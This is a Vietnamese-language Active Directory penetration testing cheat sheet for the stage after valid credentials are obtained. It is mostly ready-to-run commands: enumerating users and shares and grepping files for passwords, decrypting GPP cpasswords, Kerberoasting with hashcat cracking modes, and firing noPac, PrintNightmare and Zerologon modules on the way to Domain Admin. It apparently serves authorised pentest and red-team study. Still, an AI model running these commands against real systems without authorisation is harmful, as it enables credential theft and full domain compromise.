# 03 — Valid Credentials: Enumeration & tấn công đầu

**Trạng thái:** có **cleartext creds / NT hash / Kerberos ticket**. Cột trung tâm
của mindmap, phân nhánh ra rất nhiều hướng. Mục tiêu: enum toàn diện rồi chọn
đường ngắn nhất tới DA.

> Với NT hash: thay `-u <user> -p <pass>` bằng `-u <user> -H <hash>` (nxc) hoặc
> `-hashes :<hash>` (impacket). Với ticket: `-k -no-pass` + `KRB5CCNAME`.

---

## A. Lấy chính sách mật khẩu (LÀM TRƯỚC KHI SPRAY)

> **Khi nào chạy:** ngay khi có creds, trước mọi spray/brute.
> **Tại sao:** biết ngưỡng khóa để không lock tài khoản.

```bash
nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol         # default policy
Get-ADDefaultDomainPasswordPolicy                               # PowerShell trên Windows
ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <password> --type pass-pols
Get-ADFineGrainedPasswordPolicy -Filter *                      # Fine-grained (PSO)
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso   # PSO qua ldeep
```

- **Kết quả:** ngưỡng lockout, độ dài tối thiểu, PSO cho nhóm đặc quyền.

---

## B. Find all users / Enumerate LDAP

> **Khi nào chạy:** ngay sau khi có creds.
> **Tại sao:** liệt kê user/mô tả/nhóm → tìm mật khẩu trong `description`, SPN,
> cờ ASREP, nhóm đặc quyền.

```bash
GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>          # danh sách user
nxc smb <dc_ip> -u '<user>' -p '<password>' --users
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> all <backup_folder>   # dump toàn bộ
ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389          # HTML dễ đọc
ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all
nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users | grep -i MSOL          # tìm MSOL/mô tả
```

- **Kết quả:** box **"Username"** đầy đủ; mô tả user; tìm thấy tài khoản dịch vụ
  (MSOL → Azure AD Connect, xem file 12).

### Enumerate DNS

```bash
adidnsdump -u <domain>\\<user> -p "<password>" --print-zones <dc_ip>
```

- **Kết quả:** host ẩn trong zone DNS (box **"New targets (low hanging fruit)"**).

---

## C. BloodHound (thu thập + phân tích)

> **Khi nào chạy:** ngay khi có creds — công cụ bản đồ đường tấn công quan trọng nhất.
> **Tại sao:** dựng đồ thị để tìm đường ngắn nhất tới Domain Admins qua ACL,
> nhóm, session, delegation.

```bash
# Collector (chọn 1) — Legacy BloodHound
bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all -ns <name_server>
# BloodHound CE (rust, nhanh)
rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z
rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter='(objectGuid=*)'
# Từ Windows
sharphound.exe -c all -d <domain>
Import-Module .\sharphound.ps1; Invoke-BloodHound -CollectionMethod all -Domain <domain>
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900
```

- **Kết quả:** zip import vào BloodHound. Mark user **Owned** → chạy query.
- **Phân tích tự động** (box mindmap):
  ```bash
  AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>   # báo cáo từ dữ liệu BH
  ```
- **Query Cypher mindmap gợi ý** (rải khắp các nhánh):
  - ASREP roastable: `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u`
  - Kerberoastable (loại krbtgt): `MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa,false)=true AND NOT COALESCE(u.msa,false)=true RETURN u`
  - Unconstrained: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
  - Ai đọc LAPS: `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
  - Ai điều khiển GPO: `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p`
  - SQL admin: `MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p`

---

## D. Enumerate SMB shares & Search files

> **Khi nào chạy:** có creds; tìm file chứa bí mật.
> **Tại sao:** share nội bộ (SYSVOL/NETLOGON/IT/Backup) hay chứa mật khẩu, script,
> `.kdbx`, `.vhd`, `web.config`.

```bash
nxc smb <ip_range> -u '<user>' -p '<password>' --shares
nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus           # crawl + tải
manspider <ip_range> -c passw -e <file extensions>                       # grep nội dung file trên share
smbclient.py <domain>/<user>:<password>@<ip>                             # duyệt tương tác (impacket)
smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>
# Trên Windows:
findstr /si 'pass' *.txt *.xml *.docx *.ini                              # box "Search files"
```

- **Kết quả:** file chứa `User + Pass` → quay lại với credential mới.

---

## E. GPP Passwords (MS14-025)

> **Khi nào chạy:** là domain user bất kỳ (đọc được SYSVOL).
> **Tại sao:** mật khẩu GPP trong SYSVOL mã hoá bằng khoá AES công khai → giải mã ngay.

```bash
Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>
findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml   # Windows
msf> use auxiliary/scanner/smb/smb_enum_gpp                                   # ⚠️ msf
```

- **Kết quả:** mật khẩu local admin → PtH khắp mạng.

---

## F. Kerberoasting

> **Khi nào chạy:** là domain user bất kỳ.
> **Tại sao:** user có SPN → xin TGS → phần mã hoá bằng NT hash tài khoản dịch vụ → crack.

```bash
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
Rubeus.exe kerberoast /domain:<domain> /dc:<dcip>
# Blind/Targeted khi có quyền ghi SPN:
targetedKerberoast.py -d <domain> -u <user> -p <pass>              # tự thêm SPN → roast → xoá
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/   # không cần creds, dùng user ASREP
```

- **Kết quả:** box **"Hash TGS"** (`$krb5tgs$23$…`) → `hashcat -m 13100` (RC4) /
  `-m 19600` (AES128) / `-m 19700` (AES256).

---

## G. Known vulnerabilities (authenticated)

> **Khi nào chạy:** có creds thường; DC/service chưa vá.

| Box | Lệnh | Ghi chú |
|-----|------|---------|
| noPac | `nxc smb <ip> -u user -p pass -M nopac` | → DA nếu chưa vá |
| PrintNightmare | `nxc smb <ip> -u user -p pass -M printnightmare` | load DLL / add admin |
| Zerologon (safe scan) | `nxc smb <dc> -M zerologon` | ⚠️ unsafe thì tránh |
| smbclient.py / reg.py | truy cập từ xa với creds | công cụ Impacket |

---

## H. Enumerate ADCS / SCCM / MSSQL (nhánh ngang)

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>      # ADCS → file 06
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm   # SCCM → file 10
nxc mssql <ip_range> -u <user> -p <password>                       # MSSQL → file 11
nxc ldap <dc_ip> -u <user> -p <pass> --gmsa                        # gMSA → file 07
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps   # LAPS → file 07
```

---

## I. ACL / Delegation (phát hiện để leo thang)

```bash
findDelegation.py "<domain>"/"<user>":"<password>"                 # delegation → file 05
# ACL: xem Outbound Object Control trong BloodHound → file 09
```

---

## Checklist "Valid Credentials"

- [ ] `--pass-pol` trước
- [ ] Enum LDAP/user/description + DNS
- [ ] BloodHound → Owned → shortest path
- [ ] Shares + search files + GPP
- [ ] Kerberoast (+ targeted)
- [ ] certipy find (ADCS), gMSA, LAPS, SCCM, MSSQL
- [ ] findDelegation + ACL
- [ ] Credential mới → lặp lại file này
